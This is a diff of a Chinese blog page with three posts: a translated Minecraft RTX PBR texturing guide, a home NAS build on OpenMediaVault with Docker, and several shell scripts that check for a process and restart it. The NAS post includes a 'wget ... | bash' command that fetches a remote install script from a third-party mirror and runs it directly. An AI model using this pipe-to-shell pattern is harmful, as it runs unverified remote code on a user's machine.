   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Animal-Crossing/" rel="tag">Animal Crossing</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8A%A8%E6%A3%AE/" rel="tag">动森</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%8A%A8%E7%89%A9%E6%A3%AE%E5%8F%8B%E4%BC%9A/" rel="tag">动物森友会</a></li></ul>
@@ -432,39 +446,35 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><em>此文原文链接：</em> <a href="https://www.nvidia.com/en-us/geforce/guides/minecraft-rtx-texturing-guide/" target="_blank" rel="noopener">https://www.nvidia.com/en-us/geforce/guides/minecraft-rtx-texturing-guide/</a></p>
+        <p><em>此文原文链接：</em> <a target="_blank" rel="noopener" href="https://www.nvidia.com/en-us/geforce/guides/minecraft-rtx-texturing-guide/">https://www.nvidia.com/en-us/geforce/guides/minecraft-rtx-texturing-guide/</a></p>
 <p>基岩版Minecraft(我的世界，下述所说的我的世界均为基岩版)，即将加入光线追踪（简称：光追）的支持。届时玩家和建筑师们能见识到无与伦比的景观和类现实环境。充分利用光线追踪的特性需要先知道基于物理的纹理，是一种有额外的材质纹理细节、能发出光线等还具有其他特性的材质。</p>
 <p>在这个教程中，我们将一步一步的来创建自己的光追纹理包。或者更新自己的纹理和纹理包。因此，你的我的世界光追版本将充分利用我的世界基岩版的光追特性</p>
 <p>另外，我们将会演示如何创建一个高分辨率材质用于一个由高清晰度的方块组成的栩栩如生的世界，并且，此教程会有一个可选的、简单、容易的工作流workflow教你使用优秀的绘图软件（Photoshop等）</p>
-<p>这个教程使用的是基岩版存档，需要转换存档<a href="https://www.nvidia.com/en-us/geforce/guides/minecraft-rtx-world-conversion-guide" target="_blank" rel="noopener">点这里</a>。而且还要知道基本的游戏玩法和存档使用的方法等，同样还要最新的支持Minecraft光追的显卡驱动（目前Minecraft基岩版不支持光追）</p>
+<p>这个教程使用的是基岩版存档，需要转换存档<a target="_blank" rel="noopener" href="https://www.nvidia.com/en-us/geforce/guides/minecraft-rtx-world-conversion-guide">点这里</a>。而且还要知道基本的游戏玩法和存档使用的方法等，同样还要最新的支持Minecraft光追的显卡驱动（目前Minecraft基岩版不支持光追）</p>
 <p>这里放几张Minecraft开启光追和使用了相应材质的图片，帮助没见过的人有相应的了解。</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/04/minecraft-with-rtx-hd-textures-001-ray-tracing-on-850px.jpg" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/04/minecraft-with-rtx-hd-textures-001-ray-tracing-on-850px.jpg"></p>
 <ul>
-<li><p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/04/minecraft-with-rtx-hd-textures-002-ray-tracing-on-420px-1.jpg" alt=""></p>
-</li>
-<li><p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/04/minecraft-with-rtx-hd-textures-003-ray-tracing-on-420px-1.jpg" alt=""></p>
-</li>
+<li><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/04/minecraft-with-rtx-hd-textures-002-ray-tracing-on-420px-1.jpg"></li>
+<li><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/04/minecraft-with-rtx-hd-textures-003-ray-tracing-on-420px-1.jpg"></li>
 </ul>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/04/minecraft-rtx-dxr-ray-tracing-001-on-850px.png" alt=""></p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/04/minecraft-rtx-dxr-ray-tracing-002-on-850px.png" alt=""></p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/04/minecraft-rtx-dxr-ray-tracing-003-on-850px.png" alt=""></p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/04/Minecraft-with-RTX-and-HD-Textures-Comparison-850px.jpg" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/04/minecraft-rtx-dxr-ray-tracing-001-on-850px.png"></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/04/minecraft-rtx-dxr-ray-tracing-002-on-850px.png"></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/04/minecraft-rtx-dxr-ray-tracing-003-on-850px.png"></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/04/Minecraft-with-RTX-and-HD-Textures-Comparison-850px.jpg"></p>
 <p><strong>Minecraft 纹理概述</strong></p>
 <p>在Minecraft的Vanilla纹理包(这里翻译成纹理更正确，也就是平时说的材质包)中有许多的文件用两种法线：基础颜色和模糊(不透明度)。基础颜色法线在纹理的RGB通道中，这个纹理法线也就是我们许多人认为的Minecraft纹理(材质包)</p>
 <p>许多纹理也有另外的模糊法线都在α通道中(.TGA纹理文件)或隐藏(.PNG纹理文件)。在Minecraft光追中使用的.TAG纹理将在稍后提到</p>
 <ul>
-<li><p><img src="https://www.nvidia.com/content/dam/en-zz/Solutions/geforce/news/minecraft-rtx-texturing-guide/rail_normal_BaseColor.png" alt="Minecraft with RTX Texturing"></p>
-</li>
-<li><p><img src="https://www.nvidia.com/content/dam/en-zz/Solutions/geforce/news/minecraft-rtx-texturing-guide/rail_normal_AlphaChannel.png" alt="rail_normal_AlphaChannel"></p>
-</li>
+<li><img src="https://www.nvidia.com/content/dam/en-zz/Solutions/geforce/news/minecraft-rtx-texturing-guide/rail_normal_BaseColor.png" alt="Minecraft with RTX Texturing"></li>
+<li><img src="https://www.nvidia.com/content/dam/en-zz/Solutions/geforce/news/minecraft-rtx-texturing-guide/rail_normal_AlphaChannel.png" alt="rail_normal_AlphaChannel"></li>
 </ul>
 <p>左为基础颜色法线，右为模糊法线</p>
 <p>新的PBR系统用到了这两种法线以及另外四种法线用来描绘真实世界材质的纹理</p>
 <ul>
-<li>金属材质法线</li>
-<li>发光材质法线</li>
-<li>粗糙材质法线</li>
-<li>常规(普通)/高度法线</li>
+<li>  金属材质法线</li>
+<li>  发光材质法线</li>
+<li>  粗糙材质法线</li>
+<li>  常规(普通)/高度法线</li>
 </ul>
 <p><strong>纹理转换成游戏中对象材质的过程</strong></p>
 <p>各种各样的PBR纹理法线通过以下简单过程对应游戏中对象的材质</p>
@@ -473,33 +483,33 @@
 <p>eg.一个PBR下的金矿石方块</p>
 <p>纹理文件1 = gold_ore.png文件</p>
 <ul>
-<li>红、绿、蓝通道 = 基础颜色法线</li>
-<li>α通道[A通道] = 没有，不用于特殊纹理集(金矿石完全不透明，不透光)</li>
-<li><strong>NOTE:纹理集要用模糊法线在α通道中，见模糊法线部分</strong></li>
+<li>  红、绿、蓝通道 = 基础颜色法线</li>
+<li>  α通道[A通道] = 没有，不用于特殊纹理集(金矿石完全不透明，不透光)</li>
+<li>  <strong>NOTE:纹理集要用模糊法线在α通道中，见模糊法线部分</strong></li>
 </ul>
 <p>纹理文件2 = gold_ore_mer.PNG</p>
 <ul>
-<li>红通道 = 金属材质法线(灰度图像)</li>
-<li>绿通道 = 发光材质法线(灰度图像)</li>
-<li>蓝通道 = 粗糙材质法线(灰度图像)</li>
-<li>α通道[A通道] = 没有。这个时候还不用</li>
-<li><strong>NOTE: _mer后缀仅提示三种材质法线用在RGB通道中的顺序</strong></li>
+<li>  红通道 = 金属材质法线(灰度图像)</li>
+<li>  绿通道 = 发光材质法线(灰度图像)</li>
+<li>  蓝通道 = 粗糙材质法线(灰度图像)</li>
+<li>  α通道[A通道] = 没有。这个时候还不用</li>
+<li>  <strong>NOTE: _mer后缀仅提示三种材质法线用在RGB通道中的顺序</strong></li>
 </ul>
 <p>纹理文件3 = gold_ore_normal.PNG</p>
 <ul>
-<li>RGB通道 = 常规法线</li>
-<li><strong>NOTE:或者，纹理法线能用高度法线代替常规法线，见高度法线部分</strong></li>
-<li>α通道[A通道] = 没有，这时候不用</li>
+<li>  RGB通道 = 常规法线</li>
+<li>  <strong>NOTE:或者，纹理法线能用高度法线代替常规法线，见高度法线部分</strong></li>
+<li>  α通道[A通道] = 没有，这时候不用</li>
 </ul>
-<p><strong>NOTE:</strong>在最终的版本里，通道打包系统将升级为“纹理集”系统，有更灵活的文件命名方式和纹理法线/通道管理方式。同样，仍然可以使用原有的通道打包系统不需要重新处理你的原来的纹理文件，对于RTX我的世界Minecraft版本请使用上文提到的通道打包列表</p>
+<p>**NOTE:**在最终的版本里，通道打包系统将升级为“纹理集”系统，有更灵活的文件命名方式和纹理法线/通道管理方式。同样，仍然可以使用原有的通道打包系统不需要重新处理你的原来的纹理文件，对于RTX我的世界Minecraft版本请使用上文提到的通道打包列表</p>
 <p><strong>所需工具</strong></p>
 <p>可以用下列工具创建纹理集</p>
 <ul>
-<li>Adobe Photoshop</li>
-<li>GIMP</li>
-<li>Paint.net</li>
-<li>Pixlr.com</li>
-<li>GraphicsGale, etc.</li>
+<li>  Adobe Photoshop</li>
+<li>  GIMP</li>
+<li>  Paint.net</li>
+<li>  Pixlr.com</li>
+<li>  GraphicsGale, etc.</li>
 </ul>
 <p>此教程的绘图工具软件是PS，但是聪明的你学习了PS其他的软件也是同样的道理</p>
 <p><strong>模糊法线</strong></p>
@@ -508,57 +518,57 @@
 <p><strong>NOTE:在Minecraft RTX版本中，在RTX开启和关闭的状态下都是用同一个纹理包。当RTX关闭时调整的模糊度太低导致当RTX启用时太透明(opacity value的值太低)。RTX启用的时候，Minecraft仅会让阿尔法通道值在0.5-1的范围内来避免上述的情况，且在游戏里对应全部的模糊范围，不会有功能上的损失。RTX关闭时也对应的全部模糊的范围</strong></p>
 <p>例如：</p>
 <ol>
-<li>纹理的A值为0[黑]<br>RTX开启，纹理模糊度=0[完全透明]<br>RTX关闭，纹理模糊度=0[完全透明]</li>
-<li>纹理的A值为0.5[灰]<br>RTX开启，纹理模糊度=0[完全透明]<br>RTX关闭，纹理模糊度=0.5[50%不透明]</li>
-<li>纹理的A值为0.75[浅灰]<br>RTX开启，纹理模糊度=0.5[50%不透明]<br>RTX关闭，纹理模糊度=0.75[75%不透明]</li>
-<li>纹理的A值为1[白]<br>RTX开启，纹理模糊度=1[不透明]<br>RTX关闭，纹理模糊度=1[不透明]</li>
+<li>纹理的A值为0[黑]<br> RTX开启，纹理模糊度=0[完全透明]<br> RTX关闭，纹理模糊度=0[完全透明]</li>
+<li>纹理的A值为0.5[灰]<br> RTX开启，纹理模糊度=0[完全透明]<br> RTX关闭，纹理模糊度=0.5[50%不透明]</li>
+<li>纹理的A值为0.75[浅灰]<br> RTX开启，纹理模糊度=0.5[50%不透明]<br> RTX关闭，纹理模糊度=0.75[75%不透明]</li>
+<li>纹理的A值为1[白]<br> RTX开启，纹理模糊度=1[不透明]<br> RTX关闭，纹理模糊度=1[不透明]</li>
 </ol>
 <p><strong>新PBR纹理法线</strong></p>
 <p>PBR系统中你处理纹理时不用使用全部PBR法线，根据下面的说明可以做出很好的纹理包</p>
 <p><strong>金属材质法线</strong> - 一个像素怎么能表示方块有多像金属？</p>
 <ul>
-<li>模糊值为0：不是金属[木方块，草方块，羊毛，沙子等]</li>
-<li>模糊值为1：是金属块[金块，铁块等]</li>
-<li>灰度0-1之间也能用</li>
+<li>  模糊值为0：不是金属[木方块，草方块，羊毛，沙子等]</li>
+<li>  模糊值为1：是金属块[金块，铁块等]</li>
+<li>  灰度0-1之间也能用</li>
 </ul>
 <p><img src="https://www.nvidia.com/content/dam/en-zz/Solutions/geforce/news/minecraft-rtx-texturing-guide/RoughnessMap-850px.jpg" alt="RoughnessMap"></p>
 <p>我的世界Minecraft中的大多数方块的表面都是凹凸不平的，但可以用金属材质法线控制像素为金属[上图的白色像素]和非金属材质[上图的黑色像素]。金属像素更像金块，而非金属像素更像黄色的塑料</p>
 <p><strong>发光材质法线</strong> - 有多少像素是发光的？</p>
 <ul>
-<li>模糊值为0[黑色]代表<strong>不发光</strong></li>
-<li>模糊值为1[白色]代表<strong>发强光</strong></li>
-<li>同样可以让灰度值在0-1之间</li>
-<li>发光的颜色是由基础颜色法线中的像素决定的</li>
+<li>  模糊值为0[黑色]代表<strong>不发光</strong></li>
+<li>  模糊值为1[白色]代表<strong>发强光</strong></li>
+<li>  同样可以让灰度值在0-1之间</li>
+<li>  发光的颜色是由基础颜色法线中的像素决定的</li>
 </ul>
 <p><img src="https://www.nvidia.com/content/dam/en-zz/Solutions/geforce/news/minecraft-rtx-texturing-guide/EmissiveMap-850px.jpg" alt="EmissiveMap"></p>
 <p><strong>粗糙材质法线</strong> - 怎么用像素表示粗糙的感觉？</p>
 <ul>
-<li>模糊值为0[黑色]：光滑[玻璃，磨制的石头等]</li>
-<li>模糊值为1[白色]：很粗糙[土方块，羊毛等]</li>
-<li>同样可以让灰度值在0-1之间</li>
+<li>  模糊值为0[黑色]：光滑[玻璃，磨制的石头等]</li>
+<li>  模糊值为1[白色]：很粗糙[土方块，羊毛等]</li>
+<li>  同样可以让灰度值在0-1之间</li>
 </ul>
 <p><img src="https://www.nvidia.com/content/dam/en-zz/Solutions/geforce/news/minecraft-rtx-texturing-guide/RoughnessMap-2-850px.jpg" alt="Minecraft with RTX"></p>
 <p>上面的青金石矿的表面有金属的质感，白色的像素控制方块的粗糙程度，黑色像素控制光滑程度。剩下的像素[灰色]控制方块的质感在粗糙和光滑之间。</p>
 <p><strong>常规法线</strong> - 怎么用像素表示凹凸不平？</p>
 <ul>
-<li>常规法线通过3色通道RGB来表示光打到物体表面的行为。可以制造出一种看起来凹凸不平的表面细节</li>
+<li>  常规法线通过3色通道RGB来表示光打到物体表面的行为。可以制造出一种看起来凹凸不平的表面细节</li>
 </ul>
 <p><img src="https://www.nvidia.com/content/dam/en-zz/Solutions/geforce/news/minecraft-rtx-texturing-guide/NormalMapExample-850px.jpg" alt="NormalMap"></p>
 <ul>
-<li>RGB的值[128, 128, 255]的像素在被光照亮时不会有被粘滞和减退的现象，这种现象会出现在3Dmesh的表面的高上。如果拿不定是否会出现这种现象，就在常规法线中用上面这个颜色或者别用常规法线还能节省空间</li>
+<li>  RGB的值[128, 128, 255]的像素在被光照亮时不会有被粘滞和减退的现象，这种现象会出现在3Dmesh的表面的高上。如果拿不定是否会出现这种现象，就在常规法线中用上面这个颜色或者别用常规法线还能节省空间</li>
 </ul>
 <p><img src="https://www.nvidia.com/content/dam/en-zz/Solutions/geforce/news/minecraft-rtx-texturing-guide/NormalNormal.png" alt="NormalNormal"></p>
 <ul>
-<li>RGB颜色除了默认的颜色外不建议绘制其他颜色，除非你知道自己在做什么。常规法线通常都是在用特殊的绘制纹理软件时自动生成，下面将会详细说明</li>
+<li>  RGB颜色除了默认的颜色外不建议绘制其他颜色，除非你知道自己在做什么。常规法线通常都是在用特殊的绘制纹理软件时自动生成，下面将会详细说明</li>
 </ul>
 <p><strong>高度法线</strong> - 其实，常规纹理文件也作为高度法线</p>
 <p>高度法线有很多的限制，仅用于像素纹理材质比如16x16的vanilla香草材质。如果是非像素化的纹理，请用常规法线代替高度法线</p>
 <p>当通道以特定方式设置时将常规纹理文件当成高度法线</p>
 <p>R通道[red channel] = 高度法线[灰度]</p>
 <ul>
-<li>值为1表示像素是凸出来的</li>
-<li>值为0表示像素是凹进去的</li>
-<li>值为0.5表示没有变化(像素不凸不凹)</li>
+<li>  值为1表示像素是凸出来的</li>
+<li>  值为0表示像素是凹进去的</li>
+<li>  值为0.5表示没有变化(像素不凸不凹)</li>
 </ul>
 <p>G通道和B通道的值都应该为0，否则，游戏将把高度法线当作常规法线</p>
 <p><img src="https://www.nvidia.com/content/dam/en-zz/Solutions/geforce/news/minecraft-rtx-texturing-guide/HeightMapExample-850px.jpg" alt="HeightMapExample-850px"></p>
@@ -568,7 +578,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://mimonatch.github.io/passages/pbr-e5-9f-ba-e4-ba-8e-e7-89-a9-e7-90-86-e7-9a-84-e5-85-89-e7-85-a7-e7-ba-b9-e7-90-86-e5-8c-85-e7-bb-98-e5-88-b6rtx-e5-85-89-e8-bf-bd-e7-a0-94-e7-a9-b6-e6-95-99-e4-bd-a0-e5-81-9a-e5-85-89-e8-bf-bd/" data-id="ckqv2rh1m0042esvsbux2gbbw" class="article-share-link">Share</a>
+      <a data-url="http://mimonatch.github.io/passages/pbr-e5-9f-ba-e4-ba-8e-e7-89-a9-e7-90-86-e7-9a-84-e5-85-89-e7-85-a7-e7-ba-b9-e7-90-86-e5-8c-85-e7-bb-98-e5-88-b6rtx-e5-85-89-e8-bf-bd-e7-a0-94-e7-a9-b6-e6-95-99-e4-bd-a0-e5-81-9a-e5-85-89-e8-bf-bd/" data-id="ckqvbhfvj0030bwvsa0cy65y2" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ray-tarcing/" rel="tag">ray tarcing</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%85%89%E7%BA%BF%E8%BF%BD%E8%B8%AA/" rel="tag">光线追踪</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%85%89%E8%BF%BD/" rel="tag">光追</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%88%91%E7%9A%84%E4%B8%96%E7%95%8C/" rel="tag">我的世界</a></li></ul>
@@ -619,60 +629,62 @@
 <p><strong>硬件准备</strong></p>
 <p>这一次的NAS计划是二手优先，首先就是便宜，有性价比。但是最后只有电源是二手的，不过也是不错的1U电源。甚至发现很多可以再优化价钱的地方，但是都买回来了，放宽心态就好。</p>
 <p>首先是CPU：树莓派的ARM处理视频解码推流等能力很孱弱。这里选定了G5400和G4900最后因为差价的70块钱还是选择了G4900。支持H.265硬解，而且是8代U。不过这里如果要用我还是建议无脑G5400</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/IMG_075920200224-140809-736x1024.jpg" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/IMG_075920200224-140809-736x1024.jpg"></p>
 <p>不是打广告啊</p>
 <p>下来是主板：我选择的是华擎的H310主板，4个sata，1个pcie，支持8代U。但我这里推荐可以用B150系列的魔改主板让其支持8代U，B系列拓展性比H系列好很多。可以加装NVME硬盘等。做工也要好。而且H系列是新的主板要贵</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/IMG_075720200224-140611-736x1024.jpg" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/IMG_075720200224-140611-736x1024.jpg"></p>
 <p>硬盘：一块西数的蓝盘+手头有余的一块金士顿SSD装系统的（说实话是真浪费，120G装OMV最后最多就用10-15G）</p>
 <p>内存：英睿达DDR4 2133Hz。没什么好说的，正好赶上内存涨价的时候买的</p>
 <p>电源：台达1U电源，这种电源真贵啊</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/IMG_075820200224-140707-736x1024.jpg" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/IMG_075820200224-140707-736x1024.jpg"></p>
 <p>机箱部分：我是用lego组的哦</p>
 <p>总共下来花了我1100元左右吧，这些还不包括后面软路由等其他的设备，而且硬盘现在只有一块。只能说“壕”无性价比</p>
 <p><strong>安装OMV</strong></p>
 <p>安装的过程就是用u盘制作一个OMV的系统，这里我放两个镜像，一个5.0.5版本一个是4.1.22版本</p>
 <ul>
-<li><strong><em>5.0.5</em></strong></li>
-<li><strong><em>4.1.22</em></strong></li>
+<li>  <strong><em>5.0.5</em></strong></li>
+<li>  <strong><em>4.1.22</em></strong></li>
 </ul>
 <p>安装一步一步走就行，注意要有一个显示器，VGA和HDMI都是可以的哦。如果通过路由器的管理工具可以看见自己的NAS的IP，用ssh就可以不用显示器了</p>
 <p>其中软件源我用的中科大的ustc的（推荐哦）</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/image-9-1024x549.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/image-9-1024x549.png"></p>
 <p>安装完成后就登录吧</p>
 <p>这里我再放一遍NAS Web登录的默认用户名和密码和ssh登录的默认用户名密码</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/image-12.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/image-12.png"></p>
 <p><strong>初配置NAS</strong></p>
 <p>简单来说就是熟悉这个OMV的panel以及配置密码、静态IP、安装omv-extra、更新软件包</p>
 <p>我们先在“更新管理”里面更新软件包~PS.时间很长，慢慢等待….</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/image-10.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/image-10.png"></p>
 <p>一共90多个软件包….更新</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/image-11.png" alt=""></p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/image-13.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/image-11.png"></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/image-13.png"></p>
 <p>等了3小时，真的不容易</p>
 <p>配置静态IP，在网络里面，就不截图了</p>
 <p>之后是安装OMV-extra安装包</p>
 <p>我安装的是5.0.5的版本，但是找不到omv-extra插件了，这个插件是一个拓展的软件包，可以安装大型的软件包，docker啊什么的</p>
-<p>之后就是找到<a href="http://omv-extras.org/" target="_blank" rel="noopener">omv-extra官网</a></p>
+<p>之后就是找到<a target="_blank" rel="noopener" href="http://omv-extras.org/">omv-extra官网</a></p>
 <p>这里提供5.0.5版本的拓展包</p>
 <ul>
-<li>官网</li>
-<li>我的私有云盘</li>
+<li>  官网</li>
+<li>  我的私有云盘</li>
 </ul>
 <p>上传的时候遇到了一个问题</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/image-7.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/image-7.png"></p>
 <p>去系统日志一看，原来是没有设置timezone（时区）</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/image-8-1024x104.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/image-8-1024x104.png"></p>
 <p>在“日期与时间”中设置，设置完了还是有问题。日志中显示php的致命错误，显示有一个东西找不到，我是通过更新后可以上传下载好的deb的</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/image-14-1024x473.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/image-14-1024x473.png"></p>
 <p>安装完成了，这里注意下，你安装完了要用最新的extra软件包</p>
 <p>也可以在shell中安装</p>
-<pre><code>wget -O - https://gitee.com/Z_ero/packages/raw/master/install | bash</code></pre><p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/image-15-1024x549.png" alt=""></p>
+<pre><code>wget -O - https://gitee.com/Z_ero/packages/raw/master/install | bash
+</code></pre>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/image-15-1024x549.png"></p>
 <p>安装好了</p>
 <p>之后就是安装extra中的docker和portainer。docker不用说了吧，portainer是docker的可视化管理工具。很方便的就可以pull一个容器&amp;镜像、一键部署等选项真乃神器啊</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/image-16-1024x549.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/image-16-1024x549.png"></p>
 <p>都安装好了</p>
 <p>之后直接在9000端口访问portainer</p>
-<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/image-18-1024x549.png" alt=""></p>
+<p><img src="https://www.xiaoblogs.cn/wp-content/uploads/2020/02/image-18-1024x549.png"></p>
 <p>这里我省略了一些步骤，比如建立docker仓库等。这里我建立了一个local本地的仓库</p>
 <p><strong>OMV的高级一点的玩法</strong></p>
 <p>终于开始搭建我们的服务了</p>
@@ -681,7 +693,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://mimonatch.github.io/passages/e6-90-ad-e5-bb-ba-e8-87-aa-e5-b7-b1-e7-9a-84-e5-ae-b6-e5-ba-adnas/" data-id="ckqv2rh05000oesvsfugn3j9t" class="article-share-link">Share</a>
+      <a data-url="http://mimonatch.github.io/passages/e6-90-ad-e5-bb-ba-e8-87-aa-e5-b7-b1-e7-9a-84-e5-ae-b6-e5-ba-adnas/" data-id="ckqvbhful000bbwvs5wgj8v89" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/AIO/" rel="tag">AIO</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/NAS/" rel="tag">NAS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E9%99%84%E5%B1%9E%E5%AD%98%E5%82%A8/" rel="tag">网络附属存储</a></li></ul>
@@ -719,19 +731,21 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>原文链接： <a href="https://www.jb51.net/article/43961.htm" target="_blank" rel="noopener">https://www.jb51.net/article/43961.htm</a></p>
+        <p>原文链接： <a target="_blank" rel="noopener" href="https://www.jb51.net/article/43961.htm">https://www.jb51.net/article/43961.htm</a></p>
 <p>前几天服务器有一个长期运行的进程，提供服务。但是总是遇到进程被kill的情况。总是有小伙伴给我抱怨，<strong>我的思路就是用ps命令通过管道给grep之后通过字符串的处理提取出进程号，或者进程的名字。判断如果不存在就通过nohup &amp;重启这个进程。但也想看一看还有什么别的办法。</strong>所以闲来搜索下有关的shell，也想看一看别人的思路。拓宽思路</p>
 <p>第一种：</p>
 <pre><code>#!/bin/sh
 program=XXXX     #进程名
-sn=`ps -ef | grep $program | grep -v grep |awk &apos;{print $2}&apos;`  #获得进程端口号
-if [ &quot;${sn}&quot; = &quot;&quot; ]    #如果为空,表示进程未启动
+sn=`ps -ef | grep $program | grep -v grep |awk &#39;&#123;print $2&#125;&#39;`  #获得进程端口号
+if [ &quot;$&#123;sn&#125;&quot; = &quot;&quot; ]    #如果为空,表示进程未启动
 then
 nohup /home/oracle/XXXX  &amp;    #后台启动进程
 echo start ok !
 else
 echo running
-fi</code></pre><p>这个shell就是我的思路，第三行可以通过层层管道拿到进程的pnumber。通过ps命令+参数列出进程信息，之后通过grep得到进程名匹配的那一行之后去掉grep进程的一行，因为grep命令使用的时候也是进程，如果输入进程名就会有两个匹配的结果。之后通过awk工具得到匹配行的第二个参数（也就是进程号了）</p>
+fi
+</code></pre>
+<p>这个shell就是我的思路，第三行可以通过层层管道拿到进程的pnumber。通过ps命令+参数列出进程信息，之后通过grep得到进程名匹配的那一行之后去掉grep进程的一行，因为grep命令使用的时候也是进程，如果输入进程名就会有两个匹配的结果。之后通过awk工具得到匹配行的第二个参数（也就是进程号了）</p>
 <p>第二种：</p>
 <pre><code>#!/bin/sh
 ps -ef |grep ./FileServer &gt; /dev/null 2&gt;&amp;1  #检测进程写入/dev/null
@@ -741,12 +755,16 @@ echo logprocess run ok!
 else
 nohup /path/to/XXXX &amp;
 echo start ok !
-fi</code></pre><p>这种写法涉及到标准输入输出，2是标准错误输出，1是标准输出。/dev/null是一个黑洞，这条命令也就是标准输出和错误都给这个“黑洞”，屏幕不会有任何的显示。并且如果有这个进程也就说这一条命令的执行结果为0，也就是执行成功了。</p>
+fi
+</code></pre>
+<p>这种写法涉及到标准输入输出，2是标准错误输出，1是标准输出。/dev/null是一个黑洞，这条命令也就是标准输出和错误都给这个“黑洞”，屏幕不会有任何的显示。并且如果有这个进程也就说这一条命令的执行结果为0，也就是执行成功了。</p>
 <p>第三种：</p>
 <pre><code>#!/bin/sh
 count=`ps -fe |grep &quot;a.out&quot; | grep -v &quot;grep&quot; | wc -l`
 if [ $count -lt 1 ]; then
-/path/to/xxxx.sh</code></pre><p>这个shell看着好简洁，基本的情况和第一种有一部分是相同的。只是后面的部分不同，是统计行数的。如果小于1就说明没有这个进程了，很好理解吧！</p>
+/path/to/xxxx.sh
+</code></pre>
+<p>这个shell看着好简洁，基本的情况和第一种有一部分是相同的。只是后面的部分不同，是统计行数的。如果小于1就说明没有这个进程了，很好理解吧！</p>
 <p>第四种：</p>
 <pre><code>#! /bin/bash
 echo &quot;请输入进程名:&quot;
@@ -761,7 +779,9 @@ echo &quot;该进程存在&quot;
 else
 echo &quot;该进程不存在&quot;
 fi
-rm text1</code></pre><p>declare -i</p>
+rm text1
+</code></pre>
+<p>declare -i</p>
 <p>是将后面的参数声明为整数型</p>
 <p>这个sh就不解释啦，不过这个也是唯一一个要求有标准输入的shell，不是太满足我们的自动化的要求</p>
 <p>第五种：</p>
@@ -771,13 +791,15 @@ LENGTH=`ps -ef|grep &quot;$PNAME&quot;|grep -v grep|cut -b 49-200|wc -c `
 if test $LENGTH -eq 0
 then
 cd $PATHNAME
-nohup $PNAME &gt;/dev/null</code></pre><p>这个是最有意思的一个shell了，它前面和第一种第三种一样的，但是到了后面cut这里就是统计前面的匹配行从位置49-200的字符之后统计大小为多少byte，如果是0就说明没有这个进程嘛，因为没有匹配的行也就不可能统计出那些字占的大小啦，这是我认为思路最有趣的一个shell了。</p>
+nohup $PNAME &gt;/dev/null
+</code></pre>
+<p>这个是最有意思的一个shell了，它前面和第一种第三种一样的，但是到了后面cut这里就是统计前面的匹配行从位置49-200的字符之后统计大小为多少byte，如果是0就说明没有这个进程嘛，因为没有匹配的行也就不可能统计出那些字占的大小啦，这是我认为思路最有趣的一个shell了。</p>
